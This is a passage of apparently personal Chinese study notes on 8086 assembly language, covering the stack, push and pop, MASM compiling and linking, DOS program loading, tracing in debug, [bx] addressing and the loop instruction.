src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717121208400.png" alt="image-20240717121208400"></p><ol start="7"><li>栈为空，就相当于栈中唯一的元素出栈，出栈后，SP&#x3D;SP+2，SP原来为000EH，加2后SP&#x3D;10H</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717122256548.png" alt="image-20240717122256548"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717122355870.png" alt="image-20240717122355870"></p><p>出栈是复制，不是剪切</p><p>（如果说是格式化硬盘可以恢复，因为格式化硬盘是通过更改新的索引，数据任然是可以恢复的，只有通过不停的复制才能完全删除）</p><h3 id="3-8-栈顶越界的问题"><a href="#3-8-栈顶越界的问题" class="headerlink" title="3.8 栈顶越界的问题"></a>3.8 栈顶越界的问题</h3><ol><li><p>SS和SP只记录了栈顶的地址，依靠SS和SP可以保证在入栈和出栈时找到栈顶</p></li><li><p>当栈满的时候再使用push指令入栈，栈空的时候再是由pop指令出栈，都将发生栈顶超界问题</p></li><li><p>栈的越界是危险的</p><p>因为我们既然将一段空间安排为栈，那么在栈空间之外的空间里很可能存放了具有其他用途的数据，代码等，这些数据，代码可能是我们自己的程序的，也可能是别的程序的（毕竟一个计算机系统并不是只有我们自己的程序在运行）</p></li><li><p><strong>但是由于我们在入栈出栈时的不小心，而将这些数据，代码以外地改写，将会引发一连串的错误</strong></p></li></ol><p><strong>结论</strong></p><ol><li>我们在编程的时候要自己操心栈顶超界的问题，要根据可能用到的最大栈空间，来安排栈的大小，防止入栈的数据太多而导致的超界</li><li>执行出栈操作的时候也要注意，以防栈空的时候哦继续出栈而倒导致的超界</li></ol><h3 id="3-9-push，pop指令"><a href="#3-9-push，pop指令" class="headerlink" title="3.9 push，pop指令"></a>3.9 push，pop指令</h3><ol><li>push和pop指令是可以在寄存器和内存之间传送数据的</li></ol><p><strong>栈和内存</strong></p><p>栈空间当然也是内存空间的一部分，他只是一段可以以一种特殊的方式进行访问的内存空间</p><ol start="2"><li><p>push和pop指令的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 寄存器//将一个寄存器中的数据入栈</span><br><span class="line">pop 寄存器//出栈，用一个寄存器接收出栈的数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 段寄存器//将一个段寄存器中的数据入栈</span><br><span class="line">pop 段寄存器//出栈，用一个段寄存器接收出栈的数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 内存单元//[...]将一个内存单元处的字入栈（栈操作都是以字为单位）</span><br><span class="line">pop 内存单元//出栈，用一个内存字单元接收出栈的数据</span><br></pre></td></tr></table></figure></li></ol><p><strong>注意</strong></p><p>汇编语言不能直接向段寄存器传入数据</p><p><strong>寄存器清零</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub 寄存器，寄存器//机器码是两个字节</span><br><span class="line">mov 寄存器，0//机器码是一个字节</span><br><span class="line">xor 寄存器，寄存器//异或</span><br></pre></td></tr></table></figure><p><strong>结论</strong></p><ul><li><p>push，pop实质上就是一种内存传送指令，可以在寄存器和内存之间传送数据，与mov指令不同的是，push和pop指令访问的是内存单元的地址不是在指令中给出的，而是由SS：SP指出的</p></li><li><p>同时，push和pop指令还要改变sp中的内容</p></li><li><p>cpu在执行mov指令和指令push，pop指令是不同的，mov指令只需一步完成，就是传送。而push和pop要两步完成</p><ul><li><p>执行push时</p><p>先改变sp，在向SS：SP处传送</p></li><li><p>执行pop时</p><p>先读取值，再改变</p></li></ul></li><li><p>push，pop等栈操作指令，修改的只有SP，也就是说，栈顶的变化范围最大为：0000~FFFF（<strong>注意：这里针对的是16位的cpu</strong>）</p></li></ul><h3 id="3-10-栈段"><a href="#3-10-栈段" class="headerlink" title="3.10 栈段"></a>3.10 栈段</h3><ol><li><p>我们可以根据需要将一组内存单元定义为一个段（可以是代码段，数据段）</p></li><li><p>我们可以将一组长度为N（N&lt;&#x3D;64K）,地址连续，起始地址为16的倍数的内存单元，当作栈来用，从而定义了一个栈段</p></li><li><p>将一段内存当作栈段，<strong>仅仅是我们在编程时的一种安排</strong>，cpu并不会由于这种安排，就在执行push，pop等栈操作指令时就自动地将我们定义的栈段当作栈空间来访问，cpu只认栈顶</p></li><li><p>一段内存，可以既是代码的存储空间，又是数据的存储空间，还可以是栈空间，也可以什么都不是（关键在与cpu中寄存器的设置，即：cs，ip，ss，sp，ds的指向）</p></li></ol><h2 id="4-第一个程序"><a href="#4-第一个程序" class="headerlink" title="4 第一个程序"></a>4 第一个程序</h2><h3 id="4-1-一个源程序从写出到执行的过程"><a href="#4-1-一个源程序从写出到执行的过程" class="headerlink" title="4.1 一个源程序从写出到执行的过程"></a>4.1 一个源程序从写出到执行的过程</h3><ol><li><p>一个汇编语言程序从写出到最终执行的简要过程：</p><ol><li><p>编写</p><ol><li>使用文本编辑器（如记事本，notepad++，ultraedit等），用汇编语言编写汇编源程序</li></ol></li><li><p>编译连接</p><ol><li>使用汇编语言编译程序（MASM.EXE）对源程序文件中的源程序进行编译，产生目标文件</li><li>再用连接程序（LINK.EXE）对目标文件进行连接，生成可在操作系统中直接运行的可执行文件</li></ol><p><strong>可执行文件</strong></p><p>   可执行文件中包含两个部分内容</p><ol><li>程序（从源程序中的汇编指令翻译过来的机器码）和数据（源程序中定义的数据）</li><li>相关的描述信息（比如：程序有多大,要占多少内存空间等）</li></ol></li><li><p>执行</p><ol><li>在操作系统中，执行可执行文件中的程序</li><li>操作系统依然可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化（比如：设置CS：IP指向第一条要执行的指令），然后由cpu执行程序</li></ol></li></ol></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717204842487.png" alt="image-20240717204842487"></p><h3 id="4-2-源程序"><a href="#4-2-源程序" class="headerlink" title="4.2 源程序"></a>4.2 源程序</h3><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240717210111636.png" alt="image-20240717210111636"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code 代码</span><br><span class="line">segment 段</span><br><span class="line">assume 假定</span><br><span class="line">start 开始</span><br></pre></td></tr></table></figure><ol><li><p>汇编指令</p><p>有对应的机器码的指令，可以被编译为机器指令，最终为cpu所执行</p></li><li><p>伪指令</p><p>伪指令是没有对应的机器码的指令，最终不被cpu所执行</p><p>伪指令是由编译器来执行的指令，编译器根据伪代码来进行相关的编译工作</p></li></ol><h4 id="定义一个段"><a href="#定义一个段" class="headerlink" title="定义一个段"></a><strong>定义一个段</strong></h4><ul><li><p>segment和ends是一对成双使用的伪指令，这是在写可被编译器编译的汇编程序时，必须要用到的一堆伪指令</p></li><li><p>segment和ends的功能是定义一个段，segment说明一个段开始，ends说明一个段结束</p></li><li><p>一个段必须有一个名称来标识，使用格式为：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">段名 segment</span><br><span class="line">段名 ends</span><br></pre></td></tr></table></figure><ul><li>一个汇编程序是由多个段组成的，这些段被用来存放代码，数据或当作栈空间来使用</li><li>一个有意义的汇编程序中至少要有一个段，这个段用来存放代码</li></ul><h4 id="真正的没了"><a href="#真正的没了" class="headerlink" title="真正的没了"></a><strong>真正的没了</strong></h4><ul><li><p>end时一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译</p></li><li><p>如果程序写完了，要在结尾处加上伪指令end。否则，编译器在编译程序时，无法知道程序在何处结束</p></li></ul><p>​      <strong>切记：不要把end和ends搞混了</strong></p><h4 id="寄存器与段的关联"><a href="#寄存器与段的关联" class="headerlink" title="寄存器与段的关联"></a><strong>寄存器与段的关联</strong></h4><ul><li><p>assume：含义为“假设”</p></li><li><p>他假设某一段寄存器和程序中的某一个用segemnt···ends定义的段相关联</p></li><li><p>通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assume cs：codesg</span><br></pre></td></tr></table></figure><h4 id="源程序中的“程序“"><a href="#源程序中的“程序“" class="headerlink" title="源程序中的“程序“"></a><strong>源程序中的“程序“</strong></h4><p>汇编源程序：</p><p>​伪指令 （编译器处理）</p><p>​汇编指令（编译为机器码）</p><p>程序：源代码中最终由计算机执行，处理的指令或数据</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h4><ul><li>我们可以将源程序文件中的所有内容称为源程序，将源程序中最终由计算机执行处理的指令或数据，称为程序</li><li>程序最先以汇编指令的形式存在源程序中，经编译，连接后转变为机器码，存储在可执行文件中</li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717213909966.png" alt="image-20240717213909966"></p><h4 id="标号"><a href="#标号" class="headerlink" title="标号"></a><strong>标号</strong></h4><ul><li>一个标号指代了一个地址</li><li>codesg：放在segment的前面，作为一个段的名称，这个段的名称最终将被编译，连接程序处理为一个段的段地址</li></ul><h4 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a><strong>程序返回</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DOS中的程序运行</span><br><span class="line"></span><br><span class="line">dos是一个单任务操作系统</span><br><span class="line"></span><br><span class="line">一个程序P2在可执行文件中，则必须有一个正在运行的程序P1，将P2从可执行文件中加载入内存后，将cpu的控制权交给P2，P2才能得以运行。P2开始运行后，P1暂停运行</span><br><span class="line"></span><br><span class="line">而当P2运行完毕后，应该将cpu的控制权交还给使他可以运行的P1，此后，P1继续运行</span><br></pre></td></tr></table></figure><p>由此可知，一个程序结束后，将cpu的控制权交还给使他第一运行的程序，我们称这个过程为：<strong>程序返回</strong></p><ul><li><p>应该在程序的末尾添加返回的程序段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax，4c00</span><br><span class="line"></span><br><span class="line">int 21//这两条指令所实现的功能就是程序返回</span><br></pre></td></tr></table></figure></li></ul><h4 id="段结束，程序结束，程序返回"><a href="#段结束，程序结束，程序返回" class="headerlink" title="段结束，程序结束，程序返回"></a><strong>段结束，程序结束，程序返回</strong></h4><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717220802288.png" alt="image-20240717220802288"></p><h4 id="语法错误，逻辑错误"><a href="#语法错误，逻辑错误" class="headerlink" title="语法错误，逻辑错误"></a><strong>语法错误，逻辑错误</strong></h4><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717221002974.png" alt="image-20240717221002974"></p><h3 id="4-3-编辑源程序"><a href="#4-3-编辑源程序" class="headerlink" title="4.3 编辑源程序"></a>4.3 编辑源程序</h3><ol><li>创建一个asm文件</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717224435474.png" alt="image-20240717224435474"></p><ol start="2"><li>打开notepad++并拖入asm文件</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717224517486.png" alt="image-20240717224517486"></p><ol start="3"><li>将语言选为assembly</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717224706389.png" alt="image-20240717224706389"></p><ol start="4"><li>写入内容</li></ol><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240717231315939.png" alt="image-20240717231315939"></p><p><strong>两类错误</strong></p><ul><li><p>severe errors</p></li><li><p>找不带所给出的源文件</p></li></ul><ol start="5"><li><p>编译</p><p>将编写好的程序拖入MASM文件夹</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240717230312820.png" alt="image-20240717230312820"></p><p>打开dos，创建虚拟c盘，c盘地址为MASM文件地址</p></li></ol><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240717230338353.png" alt="image-20240717230338353"></p><p>​输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masm 目标文件//开始编译</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717231344079.png" alt="image-20240717231344079"></p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link 目标文件.OBJ//开始连接</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717231613964.png" alt="image-20240717231613964"></p><p>得到exe文件</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717231633881.png" alt="image-20240717231633881"></p><p>运行成功</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240717231755487.png" alt="image-20240717231755487"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">程序没有像显示器输出任何信息，程序只是做了一些将数据送入寄存器和假发的操作，而这些事情，我们不可能从显示屏上看出来</span><br><span class="line"></span><br><span class="line">程序执行完成后，返回，屏幕上再次出现操作系统的提示符</span><br><span class="line"></span><br><span class="line">沃兹基.索德说过：只要没有报错，就是成功</span><br></pre></td></tr></table></figure><h3 id="4-4-以简化的方式进行编译和连接"><a href="#4-4-以简化的方式进行编译和连接" class="headerlink" title="4.4 以简化的方式进行编译和连接"></a>4.4 以简化的方式进行编译和连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在masm link后加；</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717232629671.png" alt="image-20240717232629671"></p><p>加了 <code>;</code>后我们发现他就没有让我们确定太多东西了</p><h4 id="关于编译和连接"><a href="#关于编译和连接" class="headerlink" title="关于编译和连接"></a><strong>关于编译和连接</strong></h4><p>连接的作用有以下几个</p><ul><li>当源程序很大时，可以将他分成多个源程序文件来编译，每个源程序编译成为目标文件后，再用连接程序将他们来连接到一起，生成一个可执行文件</li><li>程序中带哦用某个库文件中的子程序，需要将这个库文件和该程序生成的目标连接到一起，生成一个可执行文件</li><li>一个源程序编译后，得到了存有机器码的目标文件，目标文件中的有些内容还不能直接用来生成可执行文件，连接程序将这此内容处理为最终的可执行信息。<br>所以，在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，也必须用连接程序对目标文件进行处理，生成可执行文件</li></ul><p><strong>注意</strong>：对于连接的过程，可执行文件是我们要得到的最终结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑器（Edit），编译器（masm），连接器（link），调试工具（debug）等所有工具，而这些工具都是在操作系统之上运行的程序，所以我们的学习过程必须在操作系统的环境中运行</span><br></pre></td></tr></table></figure><h3 id="4-5可执行文件中的程序装入内存并运行的原理"><a href="#4-5可执行文件中的程序装入内存并运行的原理" class="headerlink" title="4.5可执行文件中的程序装入内存并运行的原理"></a>4.5可执行文件中的程序装入内存并运行的原理</h3><p>DOS中的程序运行</p><p>dos是一个单任务操作系统</p><p>一个程序P2在可执行文件中，则必须有一个正在运行的程序P1，将P2从可执行文件中加载入内存后，将cpu的控制权交给P2，P2才能得以运行。P2开始运行后，P1暂停运行</p><p>而当P2运行完毕后，应该将cpu的控制权交还给使他可以运行的P1，此后，P1继续运行</p><h4 id="操作系统的外壳"><a href="#操作系统的外壳" class="headerlink" title="操作系统的外壳"></a><strong>操作系统的外壳</strong></h4><ol><li><p>操作系统是由多个功能模块组成的庞大，复杂的软件系统。任何通用的操作系统，都要提供一个称为shell（外壳）的程序，用户（操作人员）使用这个程序来操作计算机系统工作</p></li><li><p>DOS中有一个程序command.com（命令解释器）,这个程序在DOS中称为命令解释器，也就是DOS系统的shell</p><ul><li>我们在DOS中直接执行1.exe时，是正在运行的command将1.exe中的程序加载入内存</li><li>command设置cpu的cs:ip指向程序的第一条指令（即程序的入口），从而使程序得以运行</li><li>程序运行结束后，返回command中，cpu继续运行command</li></ul></li><li><p>汇编程序从写出到执行的过程：</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718102755380.png" alt="image-20240718102755380"></p></li></ol><h3 id="4-6-程序执行过程的追踪"><a href="#4-6-程序执行过程的追踪" class="headerlink" title="4.6 程序执行过程的追踪"></a>4.6 程序执行过程的追踪</h3><ul><li><p>为了观察程序的运行过程，我们可以使用debug</p></li><li><p>debug可以将程序加载入内存，设置CS：IP指向程序的入口，但Debug并不放弃对CPU的控制，这样，我们就可以使用Debug的相关命令来单步执行程序，查看每条指令和指令的执行结果</p></li></ul><ol><li>编写一个有入口的程序（start）</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718110634519.png" alt="image-20240718110634519"></p><ol start="2"><li><p>快速编译连接程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718110926700.png" alt="image-20240718110926700"></p></li><li><p>将strat换为其他仍可以运行</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718111437776.png" alt="image-20240718111437776"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718111458557.png" alt="image-20240718111458557"></p><p><strong>问题</strong></p><p>没有程序入口debug可以调试吗</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718112146885.png" alt="image-20240718112146885"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718112159077.png" alt="image-20240718112159077"></p><p>我们发现仍然可调</p><p>这是我们再回到有 <code>strat</code>的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug 程序.exe//进入程序</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718113230708.png" alt="image-20240718113230708"></p><p>可以看见，debug将程序从可执行文件加载入内存后，cx中存放的是程序的长度。1.exe中程序的机器吗共有12个字节</p><p><strong>exe文件中的程序的加载过程</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718114352142.png" alt="image-20240718114352142"></p><p>我们查看 <code>psp</code>区发现都是些字节</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718160645926.png" alt="image-20240718160645926"></p><p>看代码也看不出来什么</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718161223188.png" alt="image-20240718161223188"></p><p>查看<strong>代码段</strong>的数据，发现我们写的代码</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240718160914896.png" alt="image-20240718160914896"></p><p><strong>总结</strong></p><ol><li><p>程序加载后，ds中存放着程序所在内存区的段地址，这个内存区的偏移地址为0，则程序所在的内存区的地址为 <code>ds：0</code></p></li><li><p>这个内存区的前256个字节中存放的是PSP，dos用来和程序进行通信。</p></li><li><p>从256字节处向后的空间存放的就是程序了</p></li><li><p>所以，我们从ds中可以得到PSP的段地址SA，PSP的偏移地址为0，则物理地址为SA*16+0</p></li><li><p>因为PSP占256（100H）字节，所以程序的物理地址</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718161934546.png" alt="image-20240718161934546"></p><p><strong>回到程序的追踪</strong></p><p>用 <code>t</code>命令执行到 <code>int 21H</code>处</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718162342822.png" alt="image-20240718162342822"></p><p>用 <code>p</code>指令正常结束程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718162456021.png" alt="image-20240718162456021"></p><p>用 <code>q</code>退出 <code>debug</code>，回到command中</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718163055563.png" alt="image-20240718163055563"></p><ul><li><p>我们在DOS中用 <code>debug 1.exe</code>运行debug对 <code>1.exe</code>进行跟踪时，程序加载的顺序是：command加载debug，debug加载 <code>1.exe</code></p></li><li><p>返回的顺序是：从 <code>1.exe</code>中的程序返回到debug，从debug返回到command</p></li></ul><h2 id="5-BX-和loop指令"><a href="#5-BX-和loop指令" class="headerlink" title="5 [BX]和loop指令"></a>5 [BX]和loop指令</h2><p><strong>小实验</strong></p><p>我们先写一个小程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718171638567.png" alt="image-20240718171638567"></p><p>用debug单步调试后我们发现，系统并没有识别到中括号</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718171855870.png" alt="image-20240718171855870"></p><p>我们用debug写的汇编却可以被识别</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718172121252.png" alt="image-20240718172121252"></p><ul><li><p>描述一个内存单元，需要两个信息：</p><ol><li><p>内存单元的地址</p></li><li><p>内存单元的长度（类型）</p></li></ol></li><li><p>我们用[0]表示一个内存单元时，0表示单元的偏移地址，段地址默认在ds中，单元的长度（类型）可以由具体指令中的其他操作对象（比如说寄存器）指出，如前边的AX，AL</p></li><li><p>[bx]同样也表示一个内存单元，他的偏移地址在bx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx，偏移地址</span><br><span class="line">mov ax，[bx]</span><br><span class="line">mov al，[bx]</span><br></pre></td></tr></table></figure></li></ul><p><strong>loop</strong></p><ul><li>英文单词“loop”有循环的含义，显然这个指令和循环有关</li></ul><p><strong>描述性符号“（）”</strong>&#x2F;&#x2F;只是方便平时描述，汇编没有用</p><ul><li><p>为了描述上的简洁，在以后的课程中，我们将使用一个描述性的符号“（）”来表示一个寄存器或一个内存单元中的内容</p></li><li><p>应用</p><ol><li>ax中的内容为0010h，可以用：（ax）&#x3D;0010H</li><li>2000：1000内容为0100H可为（21000H）&#x3D;0100H</li><li>mov ax,[2]可为（ax）&#x3D;（（ds）*16+2）</li><li>mov [2],ax可为（（ds）*16+2）&#x3D;（ax）</li><li>add ax，2可为（ax）&#x3D;（ax）+2</li><li>add ax，bx可为（ax）&#x3D;（ax）+（bx）</li><li>push ax可为(sp)&#x3D;(sp)-2   ((ss)*16+(sp))&#x3D;(ax)</li><li>pop ax可为 ((ss)*16+(sp))&#x3D;(ax)  (sp)&#x3D;(sp)+2</li></ol></li></ul><p><strong>约定符号idata表示常量</strong></p><p>我们在debug中写过类似的指令：mov ax，[0]表示将ds：0处的数据送入ax中。指令中，在“[…]”里用一个常量0表示内存单元的偏移地址，以后我们用idata表示常量</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240718175100440.png" alt="image-20240718175100440"></p><h3 id="5-1-bx"><a href="#5-1-bx" class="headerlink" title="5.1 [bx]"></a>5.1 [bx]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br></pre></td></tr></table></figure><p>功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将SA：EA处的数据送入ax中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea，sa偏移地址和段地址的英文缩写//作者在装逼</span><br></pre></td></tr></table></figure><p>即：（ax）&#x3D;（(ds)*16+（bx））</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [bx],ax</span><br></pre></td></tr></table></figure><p>功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA：EA中</p><p>即：（(ds)*16+（bx））&#x3D;（ax）</p><p><strong>inc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc ax或值//用于将寄存器或内存位置的值增加 1</span><br></pre></td></tr></table></figure><p><strong>小提示</strong>：编写汇编语言的时候，16进制的数据必须在后面加H，如 <code>2000H</code>，十进制不用加（debug中编写默认16进制）</p><h3 id="5-2-Loop指令"><a href="#5-2-Loop指令" class="headerlink" title="5.2 Loop指令"></a>5.2 Loop指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  mov cx，循环次数</span><br><span class="line">标号:</span><br><span class="line">  循环执行的程序段</span><br><span class="line">  loop 标号</span><br></pre></td></tr></table></figure><ul><li><p>cpu执行loop指令的时候，要进行两步操作</p><ol><li>（cx）&#x3D;（cx）-1</li><li>判断cx中的值，不为零则转至执行程序，如果为零则向下执行</li></ol></li><li><p>cx会影响loop指令的执行结果</p></li><li><p>通常我们用loop指令实现循环功能，cx中存放循环次数</p></li></ul><p><strong>实操</strong></p><p>计算2的12次方</p><ol><li><p>编写程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718231359078.png" alt="image-20240718231359078"></p><p>代码解释</p><p>（1）标号</p><p>在汇编语言中，标号代表一个地址，此程序中有一个标号是。它实际上标识了一个地址，这个地址处有一条指令：add ax，ax</p><p>（2）loop s</p><p>cpu执行loop s指令的时候，要进行两步操作</p><ol><li>（cx）&#x3D;（cx）-1</li><li>判断cx中的值，不为零则转至执行程序（add ax，ax），如果为零则向下执行</li></ol></li></ol><p>2.编译连接程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718232410720.png" alt="image-20240718232410720"></p><ol start="3"><li>debug调试</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240718233038483.png" alt="image-20240718233038483"></p><p>发现经过很多t后，循环结束后，ax值变为1000</p><h3 id="5-3-在debug中跟踪用loop指令实现的循环程序"><a href="#5-3-在debug中跟踪用loop指令实现的循环程序" class="headerlink" title="5.3 在debug中跟踪用loop指令实现的循环程序"></a>5.3 在debug中跟踪用loop指令实现的循环程序</h3><p><strong>注意</strong></p><ul><li>我们说的是“赋值”，就是说，让ax中的数据的值（数据的大小）和ffff：0006单元中的数据的值（数据的大小）相等</li><li>8位数据01H和16位数据0001H的数据长度不一样，但他们的值是相等的</li></ul><p><strong>如何赋值</strong></p><ul><li><p>ffff:0006单元中的数据是XXH，若要ax中的值和ffff:0006单元中的相等，ax中的数据应为00XXH 。<br>所以，若实现ffff:0006单元向ax赋值，我们应该令(ah)&#x3D;0，(al)&#x3D;(ffff6H)</p><p><strong>有什么用？，避免越位赋值？</strong></p><p>编写一个包含大部分情况的代码</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719002049387.png" alt="image-20240719002049387"></p><p>debug调试</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719002136866.png" alt="image-20240719002136866"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719002237307.png" alt="image-20240719002237307"></p><p>我们发现在执行mov [BX],1234H时出现了 <code>WOED PTR</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WORD PTR表示指令访问的内存单元是两个字节单元，这是强制定义为字大小。由于只是给出一个内存地址，不知道希望赋予ax的，是byte还是word，所以需要用word明确指出，ptr是显示申明。</span><br></pre></td></tr></table></figure><p>通过上述代码我们发现并不存在越位赋值的问题，就算存在也会声明后进行强制赋值</p></li></ul><p><strong>注意</strong></p><p>在汇编语言的编写过程中不能以字母开头</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719003032933.png" alt="image-20240719003032933"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719003045306.png" alt="image-20240719003045306"></p><p>出现error</p><p>加上0</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719003210809.png" alt="image-20240719003210809"></p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240719003220857.png" alt="image-20240719003220857"></p><p><strong>当然</strong>，这些问题在直接在dedug中编程不存在</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240719003331528.png" alt="image-20240719003331528"></p><h4 id="（关键终于来了）debug中对循环的跟踪"><a href="#（关键终于来了）debug中对循环的跟踪" class="headerlink" title="（关键终于来了）debug中对循环的跟踪"></a>（关键终于来了）debug中对循环的跟踪</h4><p>面对多次的循环我们在进行debug调试的时候不可能真的一步一步的调试，哪有什么办法呢</p><ol><li><p>首先编写一个有多次循环的程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240719165040592.png" alt="image-20240719165040592"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 